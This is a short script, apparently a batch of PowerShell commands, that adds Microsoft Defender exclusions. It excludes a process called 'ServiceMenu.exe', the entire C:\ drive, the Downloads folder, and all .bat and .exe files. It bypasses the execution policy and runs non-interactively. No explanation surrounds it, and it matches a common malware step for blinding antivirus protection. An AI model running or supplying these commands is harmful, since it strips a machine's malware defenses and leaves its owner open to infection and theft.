PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'ServiceMenu.exe'"
PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%UserProfile%\Downloads'"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension bat
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension exe
